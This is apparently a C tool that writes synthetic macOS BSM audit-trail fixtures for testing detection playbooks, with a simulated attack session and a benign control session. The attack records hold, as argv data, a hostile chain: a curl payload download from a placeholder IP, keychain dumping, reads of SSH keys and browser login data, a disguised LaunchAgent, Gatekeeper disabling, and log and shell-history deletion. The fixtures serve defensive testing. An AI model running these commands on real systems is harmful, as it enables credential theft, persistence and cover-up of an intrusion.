/*
 * make_bsm_fixtures.c
 *
 * Writes the binary BSM audit trails in tests/fixtures/bsm/ with Apple's own
 * libbsm token functions (au_to_header32_tm, au_to_subject32, au_to_path and
 * so on). The records follow the token order the XNU kernel uses: event
 * tokens first, then the subject token, then the return token, framed by a
 * header and a trailer.
 *
 * Nothing here needs root. libbsm only builds bytes in memory. The output can
 * be checked with Apple's decoder:
 *
 *   praudit -l tests/fixtures/bsm/attack_chain.bsm
 *
 * Build and run from the repository root:
 *
 *   cc -Wno-deprecated-declarations -o /tmp/make_bsm_fixtures \
 *       tools/bsm-fixtures/make_bsm_fixtures.c -lbsm
 *   /tmp/make_bsm_fixtures tests/fixtures/bsm
 *
 * Every user name, path, process id and address in these records is made up.
 * The IP addresses come from the documentation ranges in RFC 5737 and
 * RFC 3849.
 */

#include <arpa/inet.h>
#include <bsm/audit.h>
#include <bsm/audit_kevents.h>
#include <bsm/audit_record.h>
#include <bsm/libbsm.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>

/* Made up identity for the test user. 501 is the first local user on macOS. */
#define TEST_UID 501
#define TEST_GID 20
#define TEST_AUID 501
#define TEST_ASID 100005

/* All records start at 2026-11-23 15:00:00 UTC and move forward one second each. */
#define BASE_TIME 1795446000

static FILE *CURRENT_TRAIL = NULL;
static int RECORD_NUMBER = 0;
static unsigned char BODY[65536];
static size_t BODY_LEN = 0;

/* Append one token to the record body that is being built. */
static void add_token(token_t *tok)
{
    size_t token_len = sizeof(BODY) - BODY_LEN;
    if (tok == NULL) {
        fprintf(stderr, "token constructor returned NULL\n");
        exit(1);
    }
    if (au_close_token(tok, BODY + BODY_LEN, &token_len) != 0) {
        fprintf(stderr, "au_close_token failed\n");
        exit(1);
    }
    BODY_LEN = BODY_LEN + token_len;
}

/*
 * Frame the body with a header and a trailer and write it out.
 * header_kind 32 uses a header32 token, 64 uses header64.
 */
static void finish_record(au_event_t event, int header_kind)
{
    unsigned char header[64];
    unsigned char trailer[16];
    size_t header_len = sizeof(header);
    size_t trailer_len = sizeof(trailer);
    struct timeval record_time;
    token_t *header_tok;
    int header_size;
    int record_size;

    record_time.tv_sec = BASE_TIME + RECORD_NUMBER;
    record_time.tv_usec = 250000;

    /* header32 is 18 bytes and header64 is 26 bytes. The trailer is 7. */
    if (header_kind == 64) {
        header_size = 26;
    } else {
        header_size = 18;
    }
    record_size = header_size + (int)BODY_LEN + 7;

    if (header_kind == 64) {
        header_tok = au_to_header64_tm(record_size, event, 0, record_time);
    } else {
        header_tok = au_to_header32_tm(record_size, event, 0, record_time);
    }
    if (au_close_token(header_tok, header, &header_len) != 0) {
        fprintf(stderr, "header token failed\n");
        exit(1);
    }
    if (au_close_token(au_to_trailer(record_size), trailer, &trailer_len) != 0) {
        fprintf(stderr, "trailer token failed\n");
        exit(1);
    }
    if ((int)header_len != header_size) {
        fprintf(stderr, "unexpected header size %zu\n", header_len);
        exit(1);
    }

    fwrite(header, 1, header_len, CURRENT_TRAIL);
    fwrite(BODY, 1, BODY_LEN, CURRENT_TRAIL);
    fwrite(trailer, 1, trailer_len, CURRENT_TRAIL);

    BODY_LEN = 0;
    RECORD_NUMBER = RECORD_NUMBER + 1;
}

/* Subject token for a process run by the test user in one login session. */
static void add_subject(pid_t pid, uid_t euid, gid_t egid)
{
    au_tid_t terminal;
    terminal.port = 0x03000002;
    terminal.machine = 0;
    add_token(au_to_subject32(TEST_AUID, euid, egid, TEST_UID, TEST_GID, pid, TEST_ASID, &terminal));
}

static void add_success(uint32_t return_value)
{
    add_token(au_to_return32(0, return_value));
}

static void add_failure(char error_number)
{
    add_token(au_to_return32(error_number, (uint32_t)-1));
}

/* Write a value into the body in network byte order. */
static void add_be(uint64_t value, int byte_count)
{
    int shift = (byte_count - 1) * 8;
    while (shift >= 0) {
        BODY[BODY_LEN] = (unsigned char)((value >> shift) & 0xff);
        BODY_LEN = BODY_LEN + 1;
        shift = shift - 8;
    }
}

/*
 * attribute token for the vnode the call touched.
 *
 * libbsm only exports au_to_attr32 to the kernel, so this builds the same
 * 29 bytes by hand, in the order XNU's au_to_attr32 writes them:
 * token id 0x3e, mode (2 pad bytes and 2 mode bytes), owner uid, owner gid,
 * file system id, 8 byte file id, device.
 */
static void add_attr(uint32_t mode, uint32_t owner, uint32_t group, uint64_t file_id)
{
    add_be(AUT_ATTR32, 1);
    add_be(mode & 0xffff, 4);
    add_be(owner, 4);
    add_be(group, 4);
    add_be(16777232, 4);
    add_be(file_id, 8);
    add_be(0, 4);
}

/* Apple adds an identity token with the code signing identity to exec records. */
static void add_identity(const char *signing_id, const char *team_id, uint32_t signer_type)
{
    uint8_t cdhash[20];
    int i = 0;
    while (i < 20) {
        cdhash[i] = (uint8_t)(0xa0 + i);
        i = i + 1;
    }
    add_token(au_to_identity(signer_type, signing_id, 0, team_id, 0, cdhash, sizeof(cdhash)));
}

static void exec_record(au_event_t event, pid_t pid, uid_t euid, const char *path, char **argv,
                        const char *signing_id, const char *team_id, uint32_t signer_type)
{
    add_token(au_to_exec_args(argv));
    add_token(au_to_path(path));
    add_attr(0100755, 0, 0, 1000 + pid);
    if (signing_id != NULL) {
        add_identity(signing_id, team_id, signer_type);
    }
    add_subject(pid, euid, TEST_GID);
    add_success(0);
    finish_record(event, 32);
}

static void spawn_record(pid_t parent_pid, pid_t child_pid, const char *path, char **argv)
{
    /* posix_spawn records carry the new child pid as an argument token. */
    add_token(au_to_arg32(0, "child PID", (uint32_t)child_pid));
    add_token(au_to_exec_args(argv));
    add_token(au_to_path(path));
    add_attr(0100755, 0, 0, 2000 + child_pid);
    add_identity("com.apple.xpc.launchctl", "", 1);
    add_subject(parent_pid, TEST_UID, TEST_GID);
    add_success(0);
    finish_record(AUE_POSIX_SPAWN, 32);
}

static void open_record(au_event_t event, pid_t pid, uid_t euid, const char *path, uint32_t flags, int error_number)
{
    add_token(au_to_arg32(2, "flags", flags));
    add_token(au_to_path(path));
    if (error_number == 0) {
        add_attr(0100600, TEST_UID, TEST_GID, 3000 + pid);
    }
    add_subject(pid, euid, TEST_GID);
    if (error_number == 0) {
        add_success(3);
    } else {
        add_failure((char)error_number);
    }
    finish_record(event, 32);
}

static void path_record(au_event_t event, pid_t pid, uid_t euid, const char *path)
{
    add_token(au_to_path(path));
    add_attr(0100644, TEST_UID, TEST_GID, 4000 + pid);
    add_subject(pid, euid, TEST_GID);
    add_success(0);
    finish_record(event, 32);
}

static void chmod_record(pid_t pid, const char *path, uint32_t new_mode)
{
    add_token(au_to_arg32(2, "new file mode", new_mode));
    add_token(au_to_path(path));
    add_attr(0100644, TEST_UID, TEST_GID, 5000 + pid);
    add_subject(pid, TEST_UID, TEST_GID);
    add_success(0);
    finish_record(AUE_CHMOD, 32);
}

static void rename_record(pid_t pid, const char *from_path, const char *to_path)
{
    add_token(au_to_path(from_path));
    add_attr(0100644, TEST_UID, TEST_GID, 6000 + pid);
    add_token(au_to_path(to_path));
    add_subject(pid, TEST_UID, TEST_GID);
    add_success(0);
    finish_record(AUE_RENAME, 32);
}

static void connect4_record(au_event_t event, pid_t pid, const char *address, unsigned short port)
{
    struct sockaddr_in socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sin_len = sizeof(socket_address);
    socket_address.sin_family = AF_INET;
    socket_address.sin_port = htons(port);
    inet_pton(AF_INET, address, &socket_address.sin_addr);
    add_token(au_to_arg32(1, "fd", 5));
    add_token(au_to_sock_inet32(&socket_address));
    add_subject(pid, TEST_UID, TEST_GID);
    add_success(0);
    finish_record(event, 32);
}

static void connect6_record(pid_t pid, const char *address, unsigned short port)
{
    struct sockaddr_in6 socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sin6_len = sizeof(socket_address);
    socket_address.sin6_family = AF_INET6;
    socket_address.sin6_port = htons(port);
    inet_pton(AF_INET6, address, &socket_address.sin6_addr);
    add_token(au_to_arg32(1, "fd", 6));
    add_token(au_to_sock_inet128(&socket_address));
    add_subject(pid, TEST_UID, TEST_GID);
    add_success(0);
    finish_record(AUE_CONNECT, 32);
}

static void listen_record(pid_t pid)
{
    add_token(au_to_arg32(1, "fd", 7));
    add_token(au_to_arg32(2, "backlog", 16));
    add_subject(pid, TEST_UID, TEST_GID);
    add_success(0);
    finish_record(AUE_LISTEN, 32);
}

static void setuid_record(pid_t pid, uint32_t new_uid)
{
    /* sudo is setuid root, so its effective uid is already 0 when it calls setuid. */
    add_token(au_to_arg32(1, "uid", new_uid));
    add_subject(pid, 0, TEST_GID);
    add_success(0);
    finish_record(AUE_SETUID, 32);
}

static void task_for_pid_record(pid_t pid, pid_t target_pid)
{
    au_tid_t terminal;
    terminal.port = 0;
    terminal.machine = 0;
    add_token(au_to_arg32(1, "target port", 0x1503));
    add_token(au_to_process32(0, 0, 0, 0, 0, target_pid, 0, &terminal));
    add_subject(pid, 0, TEST_GID);
    add_success(0);
    finish_record(AUE_TASKFORPID, 32);
}

static void mount_record(pid_t pid, const char *mount_point)
{
    add_token(au_to_arg32(3, "flags", 0x100000));
    add_token(au_to_text("hfs"));
    add_token(au_to_path(mount_point));
    add_subject(pid, 0, TEST_GID);
    add_success(0);
    finish_record(AUE_MOUNT, 32);
}

/* A 64 bit record, to cover header64, subject64 and return64 layouts. */
static void exec64_record(pid_t pid, const char *path, char **argv)
{
    au_tid_t terminal;
    terminal.port = 0x03000002;
    terminal.machine = 0;
    add_token(au_to_exec_args(argv));
    add_token(au_to_path(path));
    add_token(au_to_subject64(TEST_AUID, TEST_UID, TEST_GID, TEST_UID, TEST_GID, pid, TEST_ASID, &terminal));
    add_token(au_to_return64(0, 0));
    finish_record(AUE_EXECVE, 64);
}

/* An ssh login shell has an IPv6 terminal address, which needs subject32_ex. */
static void exec_ssh_record(pid_t pid, const char *path, char **argv)
{
    au_tid_addr_t terminal;
    memset(&terminal, 0, sizeof(terminal));
    terminal.at_port = 0x0a000003;
    terminal.at_type = AU_IPv6;
    inet_pton(AF_INET6, "2001:db8::1", terminal.at_addr);
    add_token(au_to_exec_args(argv));
    add_token(au_to_path(path));
    add_attr(0100755, 0, 0, 7000 + pid);
    add_token(au_to_subject32_ex(TEST_AUID, TEST_UID, TEST_GID, TEST_UID, TEST_GID, pid, TEST_ASID + 1, &terminal));
    add_success(0);
    finish_record(AUE_EXECVE, 32);
}

static FILE *open_trail(const char *directory, const char *name)
{
    char trail_path[1024];
    FILE *trail;
    snprintf(trail_path, sizeof(trail_path), "%s/%s", directory, name);
    trail = fopen(trail_path, "wb");
    if (trail == NULL) {
        perror(trail_path);
        exit(1);
    }
    RECORD_NUMBER = 0;
    return trail;
}

static void close_trail(const char *name)
{
    fclose(CURRENT_TRAIL);
    printf("Wrote %d records to %s\n", RECORD_NUMBER, name);
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <output_directory>\n", argv[0]);
        return 1;
    }

    /*
     * attack_chain.bsm tells one story inside one login session: download a
     * payload to /tmp, run it, read credentials, install a LaunchAgent, get
     * root and clean up. Each step is one record.
     */
    CURRENT_TRAIL = open_trail(argv[1], "attack_chain.bsm");
    {
        char *curl_argv[] = {"curl", "-sLo", "/private/tmp/.cache/upd", "https://203.0.113.10/upd", NULL};
        char *chmod_argv[] = {"chmod", "+x", "/private/tmp/.cache/upd", NULL};
        char *payload_argv[] = {"/private/tmp/.cache/upd", NULL};
        char *security_argv[] = {"security", "dump-keychain", "-d", NULL};
        char *cp_argv[] = {"cp", "/private/tmp/.cache/upd.plist", "/Users/alice/Library/LaunchAgents/com.apple.updater.plist", NULL};
        char *launchctl_argv[] = {"launchctl", "load", "-w", "/Users/alice/Library/LaunchAgents/com.apple.updater.plist", NULL};
        char *sudo_argv[] = {"sudo", "-s", NULL};
        char *xattr_argv[] = {"xattr", "-d", "com.apple.quarantine", "/private/tmp/.cache/upd", NULL};
        char *spctl_argv[] = {"spctl", "--master-disable", NULL};
        char *audit_argv[] = {"audit", "-t", NULL};
        char *rm_argv[] = {"rm", "-f", "/Users/alice/.zsh_history", NULL};
        char *osascript_argv[] = {"osascript", "-e", "do shell script \"id\"", NULL};

        exec_record(AUE_EXECVE, 4201, TEST_UID, "/usr/bin/curl", curl_argv, "com.apple.curl", "", 1);
        connect4_record(AUE_CONNECT, 4201, "203.0.113.10", 443);
        open_record(AUE_OPEN_RWTC, 4201, TEST_UID, "/private/tmp/.cache/upd", 0x0602, 0);
        exec_record(AUE_EXECVE, 4202, TEST_UID, "/bin/chmod", chmod_argv, "com.apple.chmod", "", 1);
        chmod_record(4202, "/private/tmp/.cache/upd", 0755);
        exec_record(AUE_EXECVE, 4203, TEST_UID, "/private/tmp/.cache/upd", payload_argv, NULL, NULL, 0);
        connect4_record(AUE_CONNECT, 4203, "198.51.100.7", 4444);
        connect6_record(4203, "2001:db8::5", 8443);
        listen_record(4203);
        open_record(AUE_OPEN_R, 4203, TEST_UID, "/Users/alice/.ssh/id_ed25519", 0x0000, 0);
        open_record(AUE_OPEN_R, 4203, TEST_UID, "/Users/alice/Library/Application Support/Google/Chrome/Default/Login Data", 0x0000, 0);
        open_record(AUE_OPEN_R, 4203, TEST_UID, "/Users/alice/Library/Application Support/com.apple.TCC/TCC.db", 0x0000, 1);
        exec_record(AUE_EXECVE, 4204, TEST_UID, "/usr/bin/security", security_argv, "com.apple.security", "", 1);
        exec_record(AUE_EXECVE, 4205, TEST_UID, "/bin/cp", cp_argv, "com.apple.cp", "", 1);
        open_record(AUE_OPEN_WTC, 4205, TEST_UID, "/Users/alice/Library/LaunchAgents/com.apple.updater.plist", 0x0601, 0);
        spawn_record(4100, 4206, "/bin/launchctl", launchctl_argv);
        exec_record(AUE_EXECVE, 4207, 0, "/usr/bin/sudo", sudo_argv, "com.apple.sudo", "", 1);
        setuid_record(4207, 0);
        path_record(AUE_UNLINKAT, 4208, 0, "/private/var/log/system.log");
        exec_record(AUE_EXECVE, 4209, TEST_UID, "/usr/bin/xattr", xattr_argv, "com.apple.xattr", "", 1);
        exec_record(AUE_EXECVE, 4210, 0, "/usr/sbin/spctl", spctl_argv, "com.apple.spctl", "", 1);
        task_for_pid_record(4203, 321);
        exec_record(AUE_EXECVE, 4211, 0, "/usr/sbin/audit", audit_argv, "com.apple.audit", "", 1);
        exec_record(AUE_EXECVE, 4212, TEST_UID, "/bin/rm", rm_argv, "com.apple.rm", "", 1);
        path_record(AUE_UNLINK, 4212, TEST_UID, "/Users/alice/.zsh_history");
        exec_record(AUE_EXECVE, 4213, TEST_UID, "/usr/bin/osascript", osascript_argv, "com.apple.osascript", "", 1);
        rename_record(4203, "/private/tmp/.cache/upd", "/Users/alice/Library/Application Support/.upd");
        mount_record(4214, "/Volumes/payload");
    }
    close_trail("attack_chain.bsm");

    /*
     * benign_session.bsm is ordinary work by the same user. None of the
     * playbooks should fire on it.
     */
    CURRENT_TRAIL = open_trail(argv[1], "benign_session.bsm");
    {
        char *ls_argv[] = {"ls", "-la", "/Users/alice/Documents", NULL};
        char *git_argv[] = {"git", "status", NULL};
        char *vim_argv[] = {"vim", "notes.txt", NULL};
        char *zsh_argv[] = {"-zsh", NULL};
        char *sw_vers_argv[] = {"sw_vers", NULL};

        exec_record(AUE_EXECVE, 5101, TEST_UID, "/bin/ls", ls_argv, "com.apple.ls", "", 1);
        exec_record(AUE_EXECVE, 5102, TEST_UID, "/usr/bin/git", git_argv, "com.apple.git", "", 1);
        open_record(AUE_OPEN_R, 5102, TEST_UID, "/Users/alice/src/project/.git/HEAD", 0x0000, 0);
        exec_record(AUE_EXECVE, 5103, TEST_UID, "/usr/bin/vim", vim_argv, "com.apple.vim", "", 1);
        open_record(AUE_OPEN_RWTC, 5103, TEST_UID, "/Users/alice/Documents/notes.txt", 0x0602, 0);
        connect4_record(AUE_CONNECT, 5104, "192.0.2.80", 443);
        exec64_record(5105, "/usr/bin/sw_vers", sw_vers_argv);
        exec_ssh_record(5106, "/bin/zsh", zsh_argv);
    }
    close_trail("benign_session.bsm");

    return 0;
}
